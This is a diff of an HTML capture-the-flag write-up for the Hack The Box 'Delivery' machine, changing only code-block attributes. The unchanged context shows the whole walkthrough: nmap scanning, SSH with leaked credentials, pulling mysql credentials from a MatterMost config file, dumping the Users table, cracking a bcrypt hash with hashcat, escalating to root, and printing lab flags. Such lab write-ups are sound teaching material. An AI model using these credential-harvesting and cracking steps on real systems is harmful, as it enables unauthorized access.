@@ -202,7 +202,7 @@ some password cracking with <code>hashcat</code>.</p>
 <h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>As with any machine, let&rsquo;s start by running an <code>nmap</code> scan to see what ports are open on the
 target machine.</p>
-<pre><code>$ sudo nmap -sV -T4 -A -p- 10.10.10.222
+<pre tabindex="0"><code>$ sudo nmap -sV -T4 -A -p- 10.10.10.222
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 08:17 EST
 Nmap scan report for delivery.htb (10.10.10.222)
@@ -302,7 +302,7 @@ gleaned. Here&rsquo;s the about secion for MatterMost.</p>
 to go dig for vulnerabilities on Google. Another interesting fact is that the underlying database
 is <code>mysql</code>. This too is good information to keep in the back of our minds as we go forward.</p>
 <p>Anyway, back to the credentials.</p>
-<pre><code>$ ssh maildeliverer@10.10.10.222
+<pre tabindex="0"><code>$ ssh maildeliverer@10.10.10.222
 maildeliverer@10.10.10.222's password:
 Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
 
@@ -320,7 +320,7 @@ if a company&rsquo;s password sharing hygiene is bad. Now that we&rsquo;ve got o
 for that user flag.</p>
 <h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Being already logged it, let&rsquo;s figure out who <code>maildeliverer</code> actually is.</p>
-<pre><code>maildeliverer@Delivery:~$ ls -la
+<pre tabindex="0"><code>maildeliverer@Delivery:~$ ls -la
 total 28
 drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 .
 drwxr-xr-x 3 root          root          4096 Dec 26 09:01 ..
@@ -333,7 +333,7 @@ drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg
 maildeliverer@Delivery:~$
 </code></pre><p>The <code>user.txt</code> file is right there and <code>maildeliverer</code> is its owner. <code>cat</code>ing the contents provides
 us the user flag.</p>
-<pre><code>maildeliverer@Delivery:~$ cat user.txt
+<pre tabindex="0"><code>maildeliverer@Delivery:~$ cat user.txt
 3b9e171484b660251a906fb574c136f2
 </code></pre><p>Up until now, no real complexity. Just a painful (but realistic) sign up process. A take away would
 be to never share credentials in a messaging application but that already resonates as a big no no
@@ -348,7 +348,7 @@ should have access to it.</p>
 MatterMost installation directory allows us to quickly stumble upon the configuration file. We can
 find it here <code>/opt/mattermost/config</code>. Since we&rsquo;re looking for some <code>mysql</code> credentials, throwing a
 <code>grep</code> command against it sounds like a good idea.</p>
-<pre><code>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json  | grep -B5 -A5 -i mysql
+<pre tabindex="0"><code>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json  | grep -B5 -A5 -i mysql
         &quot;DesktopMinVersion&quot;: &quot;&quot;,
         &quot;IosLatestVersion&quot;: &quot;&quot;,
         &quot;IosMinVersion&quot;: &quot;&quot;
@@ -371,7 +371,7 @@ actually already installed on the machine so we can use them right out of the bo
 <p>We won&rsquo;t go over how to use the <code>mysql</code> command but a quick <code>--help</code> flag or a Google search can
 help us out.</p>
 <p>Let&rsquo;s go ahead and connect to it.</p>
-<pre><code>maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser --password=&quot;Crack_The_MM_Admin_PW&quot;
+<pre tabindex="0"><code>maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser --password=&quot;Crack_The_MM_Admin_PW&quot;
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 86717
 Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
@@ -391,7 +391,7 @@ user credentials in it. MySQL provides commands to list all tables it has in the
 connected to. In this case, the database is <code>mattermost</code> &ndash; the reason why we typed
 <code>use mattermost</code>.</p>
 <p>Here&rsquo;s the output of the <code>show tables;</code> command.</p>
-<pre><code>MariaDB [mattermost]&gt; show tables;
+<pre tabindex="0"><code>MariaDB [mattermost]&gt; show tables;
 +------------------------+
 | Tables_in_mattermost   |
 +------------------------+
@@ -409,10 +409,10 @@ connected to. In this case, the database is <code>mattermost</code> &ndash; the 
 </code></pre><p>The output is shortened to make it fit a bit better and as expected, there actually is a <code>Users</code>
 table. All we have to do now is list the entries of that table by leveraging some basic SQL.
 For those unfamiliar with SQL, you can find more information <a href="https://www.w3schools.com/sql/">here</a>.</p>
-<pre><code>MariaDB [mattermost]&gt; select * from Users \G;
+<pre tabindex="0"><code>MariaDB [mattermost]&gt; select * from Users \G;
 </code></pre><p>The tailing <code>\G</code> is for formatting purposes. We can narrow down the list to the user we&rsquo;re
 interested in, <code>root</code>.</p>
-<pre><code>*************************** 5. row ***************************
+<pre tabindex="0"><code>*************************** 5. row ***************************
                 Id: dijg7mcf4tf3xrgxi5ntqdefma
           CreateAt: 1608992692294
           UpdateAt: 1609157893370
@@ -456,7 +456,7 @@ There exists a bunch of tools online to do just that and you can pump a hash int
 will tell you what type of hash it is.</p>
 <p>The hash we got from the MySQL database is a <a href="https://en.wikipedia.org/wiki/Bcrypt">BCrypt</a> hash.
 Using <code>hashcat</code> we can do a brute force an attack on the hash that we stored in a <code>hash.txt</code> file.</p>
-<pre><code>hashcat -a 3 -m 3200 hash.txt PleaseSubscribe!?a?a
+<pre tabindex="0"><code>hashcat -a 3 -m 3200 hash.txt PleaseSubscribe!?a?a
 hashcat (v6.1.1) starting...
 
 OpenCL API (OpenCL 2.1 AMD-APP (3188.4)) - Platform #1 [Advanced Micro
@@ -513,7 +513,7 @@ logical step was <code>?a?a</code> as using something like <code>PleaseSubscribe
 character combinations only, skipping over two character combinations.</p>
 <p>In any case, we now have <code>root</code>&rsquo;s password: <code>PleaseSubscribe!21</code>. Still logged into the SSH session
 for the <code>maildeliverer</code> user, we can try to escalate privileges using <code>su</code></p>
-<pre><code>maildeliverer@Delivery:~$ su
+<pre tabindex="0"><code>maildeliverer@Delivery:~$ su
 Password:
 root@Delivery:/home/maildeliverer# cat /root/root.txt
 c6b16aa7f637fc4e61444854fac70874
